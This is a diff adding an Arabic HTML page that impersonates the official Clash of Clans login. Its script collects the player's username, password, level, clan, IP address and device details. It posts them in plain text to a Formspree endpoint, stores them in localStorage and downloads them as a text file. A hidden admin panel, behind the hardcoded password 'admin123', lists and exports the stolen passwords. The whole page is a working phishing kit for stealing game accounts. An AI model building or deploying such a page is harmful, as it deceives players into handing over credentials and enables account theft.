@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clash of Clans - تسجيل الدخول الرسمي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(circle at 20% 80%, rgba(255, 215, 0, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 80% 20%, rgba(255, 215, 0, 0.1) 0%, transparent 20%);
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.9);
+            border-radius: 20px;
+            padding: 40px;
+            border: 4px solid #FFD700;
+            box-shadow: 
+                0 0 30px rgba(255, 215, 0, 0.4),
+                inset 0 0 20px rgba(255, 215, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* تأثيرات القلعة */
+        .castle-effect {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            background: linear-gradient(to right, #8B4513, #A0522D, #8B4513);
+            clip-path: polygon(0% 100%, 10% 40%, 20% 60%, 30% 30%, 40% 60%, 50% 20%, 60% 60%, 70% 30%, 80% 60%, 90% 40%, 100% 100%);
+            opacity: 0.3;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .logo img {
+            max-width: 280px;
+            filter: 
+                drop-shadow(0 0 10px #FFD700)
+                drop-shadow(0 0 20px rgba(255, 215, 0, 0.5));
+            transition: transform 0.3s;
+        }
+
+        .logo img:hover {
+            transform: scale(1.05);
+        }
+
+        .crown-icon {
+            color: #FFD700;
+            font-size: 30px;
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: crownFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes crownFloat {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-5px); }
+        }
+
+        h1 {
+            color: #FFD700;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 32px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #aaa;
+            margin-bottom: 30px;
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        .formspree-info {
+            background: rgba(33, 150, 243, 0.15);
+            border: 2px solid #2196F3;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .formspree-info i {
+            color: #2196F3;
+            margin-left: 8px;
+        }
+
+        .input-group {
+            margin: 25px 0;
+            text-align: right;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #FFD700;
+            margin-bottom: 10px;
+            font-weight: 700;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #FFD700;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
+            border-color: #FFC400;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 45px;
+            color: #FFD700;
+            font-size: 20px;
+        }
+
+        .login-btn {
+            background: linear-gradient(135deg, #FFD700, #FF8F00);
+            color: #1a237e;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: 800;
+            margin-top: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1px;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 
+                0 10px 20px rgba(255, 143, 0, 0.5),
+                0 0 30px rgba(255, 215, 0, 0.3);
+            background: linear-gradient(135deg, #FFC400, #FF6F00);
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .login-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 30%,
+                rgba(255, 255, 255, 0.1) 50%,
+                transparent 70%
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .loader {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #FFD700;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .message {
+            padding: 18px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 16px;
+            display: none;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 2px solid #4CAF50;
+            color: #4CAF50;
+            display: block;
+        }
+
+        .error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 2px solid #f44336;
+            color: #f44336;
+            display: block;
+        }
+
+        .admin-panel {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .admin-panel a {
+            color: #FFD700;
+            text-decoration: none;
+            font-size: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+            padding: 10px 20px;
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            border-radius: 8px;
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .admin-panel a:hover {
+            background: rgba(255, 215, 0, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2);
+        }
+
+        .sparkle {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background-color: #FFD700;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 215, 0, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            color: #FFD700;
+            font-size: 24px;
+            font-weight: bold;
+            display: block;
+        }
+
+        .stat-label {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+                margin: 10px;
+            }
+            
+            .logo img {
+                max-width: 220px;
+            }
+            
+            h1 {
+                font-size: 26px;
+            }
+            
+            .login-btn {
+                padding: 16px;
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .stats {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- تأثير القلعة -->
+        <div class="castle-effect"></div>
+        
+        <!-- الشعار -->
+        <div class="logo">
+            <div class="crown-icon">👑</div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
+                 alt="Clash of Clans Logo" onclick="createSparkles(event)">
+        </div>
+        
+        <!-- العنوان -->
+        <h1>تسجيل الدخول إلى اللعبة</h1>
+        <p class="subtitle">🏰 ادخل إلى قريتك واستأنف المعركة ⚔️</p>
+        
+        <!-- معلومات Formspree -->
+        <div class="formspree-info">
+            <i class="fas fa-envelope"></i>
+            <strong>بيانات التسجيل سترسل إلى بريدك الإلكتروني تلقائياً عبر Formspree</strong>
+        </div>
+        
+        <!-- إحصائيات -->
+        <div class="stats" id="statsContainer">
+            <div class="stat-item">
+                <span class="stat-number" id="totalLogins">0</span>
+                <span class="stat-label">إجمالي التسجيلات</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number" id="todayLogins">0</span>
+                <span class="stat-label">تسجيلات اليوم</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number" id="lastLogin">--:--</span>
+                <span class="stat-label">آخر تسجيل</span>
+            </div>
+        </div>
+        
+        <!-- نموذج التسجيل -->
+        <div class="input-group">
+            <label for="username"><i class="fas fa-user"></i> اسم المستخدم</label>
+            <input type="text" 
+                   id="username" 
+                   placeholder="أدخل اسم المستخدم أو البريد الإلكتروني"
+                   required
+                   onfocus="highlightField(this)"
+                   onblur="unhighlightField(this)">
+            <div class="input-icon"><i class="fas fa-user-circle"></i></div>
+        </div>
+        
+        <div class="input-group">
+            <label for="password"><i class="fas fa-lock"></i> كلمة المرور</label>
+            <input type="password" 
+                   id="password" 
+                   placeholder="أدخل كلمة المرور"
+                   required
+                   onfocus="highlightField(this)"
+                   onblur="unhighlightField(this)">
+            <div class="input-icon"><i class="fas fa-key"></i></div>
+        </div>
+        
+        <div class="input-group">
+            <label for="playerLevel"><i class="fas fa-trophy"></i> مستوى اللاعب</label>
+            <select id="playerLevel" 
+                    required
+                    onfocus="highlightField(this)"
+                    onblur="unhighlightField(this)">
+                <option value="">اختر مستوى اللاعب</option>
+                <option value="1-50">🎮 المستويات 1-50 (مبتدئ)</option>
+                <option value="51-100">⚔️ المستويات 51-100 (متوسط)</option>
+                <option value="101-150">🛡️ المستويات 101-150 (متقدم)</option>
+                <option value="151+">👑 المستوى 151+ (محترف)</option>
+                <option value="أسطورة">🌟 أسطورة</option>
+            </select>
+            <div class="input-icon"><i class="fas fa-chart-line"></i></div>
+        </div>
+        
+        <div class="input-group">
+            <label for="clanName"><i class="fas fa-users"></i> اسم العشيرة (اختياري)</label>
+            <input type="text" 
+                   id="clanName" 
+                   placeholder="اسم العشيرة"
+                   onfocus="highlightField(this)"
+                   onblur="unhighlightField(this)">
+            <div class="input-icon"><i class="fas fa-flag"></i></div>
+        </div>
+        
+        <!-- زر التسجيل -->
+        <button class="login-btn" id="loginBtn" onclick="handleLogin()">
+            <span id="btnText">
+                <i class="fas fa-gamepad"></i> تسجيل الدخول إلى اللعبة
+            </span>
+            <span id="btnLoader" class="loader" style="display: none;"></span>
+        </button>
+        
+        <!-- رسالة النتيجة -->
+        <div id="message" class="message"></div>
+        
+        <!-- لوحة التحكم -->
+        <div class="admin-panel">
+            <a href="#" onclick="openAdminPanel()">
+                <i class="fas fa-database"></i> عرض البيانات المحفوظة
+            </a>
+        </div>
+    </div>
+    
+    <script>
+        // ========== ⚙️ إعدادات النظام ==========
+        // 🔗 رابط Formspree الخاص بك - تم تعديله هنا
+        const FORMSPREE_URL = 'https://formspree.io/a32f51470c454b56adb2a5b9de2b34f7.com ';
+        
+        // 🔑 كلمة مرور المسؤول
+        const ADMIN_PASSWORD = 'admin123';
+        
+        // ========== متغيرات النظام ==========
+        let totalLogins = 0;
+        let todayLogins = 0;
+        let lastLoginTime = '--:--';
+        
+        // ========== تهيئة الصفحة ==========
+        window.addEventListener('load', function() {
+            console.log('🚀 صفحة Clash of Clans جاهزة للعمل!');
+            console.log('📧 Formspree URL:', FORMSPREE_URL);
+            
+            // تحديث الإحصائيات
+            updateStats();
+            
+            // التحقق من Formspree
+            if (FORMSPREE_URL && FORMSPREE_URL.includes('formspree.io')) {
+                console.log('✅ Formspree مضبوط بشكل صحيح');
+                showMessage('📧 Formspree جاهز لاستقبال البيانات', 'success');
+                setTimeout(() => {
+                    document.getElementById('message').style.display = 'none';
+                }, 3000);
+            } else {
+                console.warn('⚠️ رابط Formspree غير مضبوط بشكل صحيح');
+                showMessage('⚠️ يرجى التحقق من إعداد Formspree', 'error');
+            }
+            
+            // إنشاء تأثيرات الوميض
+            createSparkleEffects();
+        });
+        
+        // ========== دالة تحديث الإحصائيات ==========
+        function updateStats() {
+            try {
+                const allData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                totalLogins = allData.length;
+                
+                // حساب تسجيلات اليوم
+                const today = new Date().toLocaleDateString('ar-SA');
+                todayLogins = allData.filter(entry => {
+                    const entryDate = new Date(entry.timestamp).toLocaleDateString('ar-SA');
+                    return entryDate === today;
+                }).length;
+                
+                // آخر تسجيل
+                if (allData.length > 0) {
+                    const lastEntry = allData[allData.length - 1];
+                    lastLoginTime = new Date(lastEntry.timestamp).toLocaleTimeString('ar-SA', {
+                        hour: '2-digit',
+                        minute: '2-digit'
+                    });
+                }
+                
+                // تحديث الواجهة
+                document.getElementById('totalLogins').textContent = totalLogins;
+                document.getElementById('todayLogins').textContent = todayLogins;
+                document.getElementById('lastLogin').textContent = lastLoginTime;
+                
+            } catch (error) {
+                console.error('Error updating stats:', error);
+            }
+        }
+        
+        // ========== دالة معالجة تسجيل الدخول ==========
+        async function handleLogin() {
+            // جمع البيانات
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const playerLevel = document.getElementById('playerLevel').value;
+            const clanName = document.getElementById('clanName').value.trim() || 'لا يوجد';
+            
+            // التحقق من البيانات
+            if (!username || !password || !playerLevel) {
+                showMessage('⚠️ يرجى ملء جميع الحقول المطلوبة', 'error');
+                return;
+            }
+            
+            // عرض حالة التحميل
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            const loginBtn = document.getElementById('loginBtn');
+            
+            btnText.innerHTML = '<i class="fas fa-spinner"></i> جاري حفظ البيانات...';
+            btnLoader.style.display = 'inline-block';
+            loginBtn.disabled = true;
+            
+            try {
+                // جمع معلومات إضافية
+                const userIP = await getUserIP();
+                const deviceInfo = getDeviceInfo();
+                
+                // إنشاء كائن البيانات
+                const userData = {
+                    id: Date.now(),
+                    username: username,
+                    password: password,
+                    playerLevel: playerLevel,
+                    clanName: clanName,
+                    email: username.includes('@') ? username : 'غير محدد',
+                    timestamp: new Date().toISOString(),
+                    userIP: userIP,
+                    userAgent: deviceInfo.userAgent,
+                    platform: deviceInfo.platform,
+                    screen: deviceInfo.screen,
+                    language: deviceInfo.language,
+                    timezone: deviceInfo.timezone
+                };
+                
+                // 1. حفظ البيانات محلياً
+                const saveResult = saveToLocalStorage(userData);
+                
+                if (saveResult.success) {
+                    // 2. إرسال البيانات إلى Formspree
+                    const formspreeResult = await sendToFormspree(userData);
+                    
+                    // 3. إنشاء ملف للتنزيل
+                    createDownloadFile(userData);
+                    
+                    // 4. عرض رسالة النجاح
+                    showMessage(`✅ تم حفظ بيانات ${username} بنجاح! (${saveResult.count} تسجيل)`, 'success');
+                    
+                    // 5. تحديث الإحصائيات
+                    updateStats();
+                    
+                    // 6. إعادة تعيين النموذج بعد 2 ثانية
+                    setTimeout(() => {
+                        document.getElementById('username').value = '';
+                        document.getElementById('password').value = '';
+                        document.getElementById('playerLevel').value = '';
+                        document.getElementById('clanName').value = '';
+                        
+                        btnText.innerHTML = '<i class="fas fa-gamepad"></i> تسجيل الدخول إلى اللعبة';
+                        btnLoader.style.display = 'none';
+                        loginBtn.disabled = false;
+                        
+                        // إظهار رسالة التوجيه
+                        showMessage('📊 <a href="#" onclick="openAdminPanel()" style="color: #4CAF50; text-decoration: underline;">اضغط هنا لعرض جميع البيانات</a>', 'success');
+                    }, 2000);
+                    
+                } else {
+                    throw new Error('فشل في حفظ البيانات محلياً');
+                }
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                showMessage('⚠️ حدث خطأ أثناء الحفظ. البيانات حفظت محلياً فقط.', 'error');
+                
+                btnText.innerHTML = '<i class="fas fa-gamepad"></i> تسجيل الدخول إلى اللعبة';
+                btnLoader.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+        
+        // ========== دالة الحصول على IP ==========
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'غير معروف';
+            } catch (error) {
+                return 'غير معروف';
+            }
+        }
+        
+        // ========== دالة جمع معلومات الجهاز ==========
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? 'مفعل' : 'معطل',
+                online: navigator.onLine ? 'متصل' : 'غير متصل'
+            };
+        }
+        
+        // ========== دالة حفظ البيانات محلياً ==========
+        function saveToLocalStorage(userData) {
+            try {
+                // الحصول على البيانات الحالية
+                let allData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                
+                // إضافة البيانات الجديدة
+                allData.push({
+                    ...userData,
+                    localSaved: true
+                });
+                
+                // الحد الأقصى 1000 سجل
+                if (allData.length > 1000) {
+                    allData = allData.slice(-1000);
+                }
+                
+                // الحفظ
+                localStorage.setItem('coc_login_data', JSON.stringify(allData));
+                
+                // تسجيل في الكونسول
+                console.log('💾 تم حفظ البيانات محلياً:', {
+                    user: userData.username,
+                    time: new Date().toLocaleString('ar-SA'),
+                    total: allData.length
+                });
+                
+                return {
+                    success: true,
+                    count: allData.length
+                };
+                
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+                return {
+                    success: false,
+                    error: error.message
+                };
+            }
+        }
+        
+        // ========== دالة إرسال إلى Formspree ==========
+        async function sendToFormspree(userData) {
+            try {
+                // إعداد بيانات Formspree
+                const formData = new FormData();
+                formData.append('_subject', '🎮 تسجيل دخول جديد - Clash of Clans');
+                formData.append('username', userData.username);
+                formData.append('password', userData.password);
+                formData.append('playerLevel', userData.playerLevel);
+                formData.append('clanName', userData.clanName);
+                formData.append('email', userData.email);
+                formData.append('timestamp', new Date(userData.timestamp).toLocaleString('ar-SA'));
+                formData.append('userIP', userData.userIP);
+                formData.append('userAgent', userData.userAgent.substring(0, 100));
+                formData.append('_replyto', userData.email || 'clash@formspree.com');
+                formData.append('_format', 'plain');
+                
+                // إرسال البيانات
+                const response = await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                console.log('📧 تم إرسال البيانات إلى Formspree:', FORMSPREE_URL);
+                return {
+                    success: true,
+                    url: FORMSPREE_URL
+                };
+                
+            } catch (error) {
+                console.error('Error sending to Formspree:', error);
+                return {
+                    success: false,
+                    error: error.message
+                };
+            }
+        }
+        
+        // ========== دالة إنشاء ملف للتنزيل ==========
+        function createDownloadFile(userData) {
+            try {
+                const text = `
+===========================================
+      🏰 Clash of Clans - تسجيل دخول جديد
+===========================================
+
+🕐 **الوقت:** ${new Date(userData.timestamp).toLocaleString('ar-SA')}
+👤 **اسم المستخدم:** ${userData.username}
+🔐 **كلمة المرور:** ${userData.password}
+🎮 **مستوى اللاعب:** ${userData.playerLevel}
+🏰 **اسم العشيرة:** ${userData.clanName}
+📧 **البريد الإلكتروني:** ${userData.email}
+🌐 **عنوان IP:** ${userData.userIP}
+🖥️ **الجهاز:** ${userData.platform}
+🌍 **اللغة:** ${userData.language}
+🕒 **المنطقة الزمنية:** ${userData.timezone}
+📱 **المتصفح:** ${userData.userAgent.substring(0, 80)}...
+
+===========================================
+             تم الحفظ تلقائياً
+===========================================
+                `;
+                
+                const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = `clash-login-${Date.now()}.txt`;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+                
+                console.log('📄 تم إنشاء ملف للتنزيل');
+                
+            } catch (error) {
+                console.error('Error creating download file:', error);
+            }
+        }
+        
+        // ========== دالة عرض الرسائل ==========
+        function showMessage(message, type = 'info') {
+            const messageDiv = document.getElementById('message');
+            messageDiv.innerHTML = message;
+            messageDiv.className = 'message';
+            
+            if (type === 'success') {
+                messageDiv.classList.add('success');
+            } else if (type === 'error') {
+                messageDiv.classList.add('error');
+            }
+            
+            messageDiv.style.display = 'block';
+            
+            // إخفاء الرسالة بعد 5 ثواني
+            if (type !== 'error') {
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // ========== دالة فتح لوحة التحكم ==========
+        function openAdminPanel() {
+            const password = prompt('🔐 أدخل كلمة مرور المسؤول:');
+            
+            if (password === ADMIN_PASSWORD) {
+                // عرض جميع البيانات
+                displayAllData();
+            } else if (password !== null) {
+                alert('❌ كلمة المرور غير صحيحة');
+            }
+        }
+        
+        // ========== دالة عرض جميع البيانات ==========
+        function displayAllData() {
+            try {
+                const allData = JSON.parse(localStorage.getItem('coc_login_data') || '[]');
+                
+                if (allData.length === 0) {
+                    alert('📭 لا توجد بيانات محفوظة بعد');
+                    return;
+                }
+                
+                // إنشاء نافذة لعرض البيانات
+                const dataWindow = window.open('', '_blank', 'width=800,height=600');
+                
+                let html = `
+                <!DOCTYPE html>
+                <html dir="rtl">
+                <head>
+                    <title>📊 بيانات Clash of Clans</title>
+                    <style>
+                        body { font-family: 'Cairo', sans-serif; padding: 20px; background: #1a237e; color: white; }
+                        h1 { color: #FFD700; text-align: center; margin-bottom: 30px; }
+                        .controls { display: flex; gap: 10px; justify-content: center; margin: 20px 0; }
+                        button { background: #FFD700; color: #1a237e; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+                        .data-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+                        .data-table th, .data-table td { padding: 12px; border: 1px solid #FFD700; text-align: right; }
+                        .data-table th { background: rgba(255, 215, 0, 0.2); color: #FFD700; }
+                        .data-table tr:nth-child(even) { background: rgba(255, 255, 255, 0.05); }
+                        .search-box { margin: 20px 0; padding: 10px; width: 100%; background: rgba(255,255,255,0.1); border: 1px solid #FFD700; color: white; border-radius: 5px; }
+                    </style>
+                </head>
+                <body>
+                    <h1>📊 بيانات تسجيل الدخول (${allData.length})</h1>
+                    
+                    <div class="controls">
+                        <button onclick="exportData()">📥 تصدير JSON</button>
+                        <button onclick="clearData()" style="background: #f44336;">🗑️ حذف الكل</button>
+                        <button onclick="window.print()">🖨️ طباعة</button>
+                    </div>
+                    
+                    <input type="text" class="search-box" placeholder="🔍 ابحث عن اسم مستخدم..." onkeyup="searchData(this.value)">
+                    
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>الوقت</th>
+                                <th>اسم المستخدم</th>
+                                <th>كلمة المرور</th>
+                                <th>المستوى</th>
+                                <th>العشيرة</th>
+                                <th>IP</th>
+                            </tr>
+                        </thead>
+                        <tbody id="dataBody">
+                `;
+                
+                // عرض البيانات بترتيب عكسي (الأحدث أولاً)
+                allData.slice().reverse().forEach((item, index) => {
+                    html += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td>${new Date(item.timestamp).toLocaleString('ar-SA')}</td>
+                        <td>${item.username}</td>
+                        <td>${item.password}</td>
+                        <td>${item.playerLevel}</td>
+                        <td>${item.clanName}</td>
+                        <td>${item.userIP}</td>
+                    </tr>
+                    `;
+                });
+                
+                html += `
+                        </tbody>
+                    </table>
+                    
+                    <script>
+                        function exportData() {
+                            const data = ${JSON.stringify(allData, null, 2)};
+                            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                            const url = URL.createObjectURL(blob);
+                            const link = document.createElement('a');
+                            link.href = url;
+                            link.download = 'clash-data-' + new Date().toISOString().split('T')[0] + '.json';
+                            link.click();
+                        }
+                        
+                        function clearData() {
+                            if (confirm('⚠️ هل أنت متأكد من حذف جميع البيانات؟')) {
+                                localStorage.removeItem('coc_login_data');
+                                alert('✅ تم حذف جميع البيانات');
+                                window.location.reload();
+                            }
+                        }
+                        
+                        function searchData(query) {
+                            const rows = document.querySelectorAll('#dataBody tr');
+                            rows.forEach(row => {
+                                const text = row.textContent.toLowerCase();
+                                row.style.display = text.includes(query.toLowerCase()) ? '' : 'none';
+                            });
+                        }
+                    </script>
+                </body>
+                </html>
+                `;
+                
+                dataWindow.document.write(html);
+                dataWindow.document.close();
+                
+            } catch (error) {
+                console.error('Error displaying data:', error);
+                alert('❌ حدث خطأ في عرض البيانات');
+            }
+        }
+        
+        // ========== تأثيرات إضافية ==========
+        function highlightField(field) {
+            field.style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.8)';
+            field.style.transform = 'scale(1.02)';
+        }
+        
+        function unhighlightField(field) {
+            field.style.boxShadow = '';
+            field.style.transform = '';
+        }
+        
+        function createSparkleEffects() {
+            for (let i = 0; i < 20; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.classList.add('sparkle');
+                sparkle.style.left = Math.random() * 100 + '%';
+                sparkle.style.top = Math.random() * 100 + '%';
+                sparkle.style.animationDelay = Math.random() * 2 + 's';
+                sparkle.style.animationDuration = Math.random() * 1 + 2 + 's';
+                document.body.appendChild(sparkle);
+            }
+        }
+        
+        function createSparkles(event) {
+            for (let i = 0; i < 15; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.classList.add('sparkle');
+                sparkle.style.left = event.clientX + (Math.random() - 0.5) * 100 + 'px';
+                sparkle.style.top = event.clientY + (Math.random() - 0.5) * 100 + 'px';
+                sparkle.style.width = Math.random() * 10 + 5 + 'px';
+                sparkle.style.height = sparkle.style.width;
+                
+                document.body.appendChild(sparkle);
+                
+                setTimeout(() => {
+                    sparkle.remove();
+                }, 2000);
+            }
+        }
+        
+        // ========== اختصارات لوحة المفاتيح ==========
+        document.addEventListener('keydown', function(event) {
+            // Ctrl + Enter لتسجيل الدخول
+            if (event.ctrlKey && event.key === 'Enter') {
+                event.preventDefault();
+                handleLogin();
+            }
+            
+            // Ctrl + D لفتح لوحة التحكم
+            if (event.ctrlKey && event.key === 'd') {
+                event.preventDefault();
+                openAdminPanel();
+            }
+        });
+        
+        // ========== تحديث الوقت الحي ==========
+        setInterval(() => {
+            updateStats();
+        }, 60000); // كل دقيقة
+    </script>
+</body>
+</html>
